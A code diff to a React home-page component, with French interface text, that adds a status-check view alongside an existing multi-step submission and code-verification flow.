@@ -7,6 +7,7 @@ import CodeWaiting from "@/components/CodeWaiting";
 import WaitingQueue from "@/components/WaitingQueue";
 import VerificationSuccess from "@/components/VerificationSuccess";
 import ResultScreen from "@/components/ResultScreen";
+import StatusCheck from "@/components/StatusCheck";
 
 export default function Home() {
   const getParams = () => new URLSearchParams(window.location.search);
@@ -26,6 +27,7 @@ export default function Home() {
   const [submittedData, setSubmittedData] = useState(null);
   const [submissionId, setSubmissionId] = useState(getParams().get("id") || null);
   const pollingRef = useRef(null);
+  const [showStatusCheck, setShowStatusCheck] = useState(false);
 
   // Handle ?trigger=ID from Discord (send code ready)
   useEffect(() => {
@@ -131,24 +133,30 @@ export default function Home() {
       <div className="absolute bottom-0 right-0 w-[400px] h-[400px] bg-accent/10 rounded-full blur-[100px] pointer-events-none" />
 
       <div className="relative z-10 w-full max-w-md">
-        {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} />}
-        {step === "validation" && <SuccessScreen data={submittedData} />}
-        {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
-        {step === "waiting"    && <CodeWaiting />}
-        {step === "queue"      && <WaitingQueue />}
-        {step === "verified"   && <VerificationSuccess data={submittedData} />}
-        {step === "triggerAction" && (
-          <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
+        {showStatusCheck ? (
+          <StatusCheck onBack={() => setShowStatusCheck(false)} />
+        ) : (
+          <>
+            {step === "form"       && <SubmissionForm onSubmit={handleSubmit} loading={loading} onStatusCheck={() => setShowStatusCheck(true)} />}
+            {step === "validation" && <SuccessScreen data={submittedData} />}
+            {step === "code"       && <CodeVerification data={submittedData} onSubmit={handleCodeSubmit} loading={loading} />}
+            {step === "waiting"    && <CodeWaiting />}
+            {step === "queue"      && <WaitingQueue />}
+            {step === "verified"   && <VerificationSuccess data={submittedData} />}
+            {step === "triggerAction" && (
+              <div className="text-center text-muted-foreground text-sm py-10">Traitement en cours...</div>
+            )}
+            {step === "adminDone" && (
+              <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
+                <div className="text-4xl mb-4">✅</div>
+                <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
+                <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
+              </div>
+            )}
+            {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
+            {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
+          </>
         )}
-        {step === "adminDone" && (
-          <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
-            <div className="text-4xl mb-4">✅</div>
-            <h2 className="font-heading text-xl font-bold text-foreground mb-2">Action effectuée</h2>
-            <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
-          </div>
-        )}
-        {step === "wrong"      && <ResultScreen type="wrong" onBack={handleBack} />}
-        {step === "expired"    && <ResultScreen type="expired" onBack={handleRetryCode} />}
       </div>
     </div>
   );
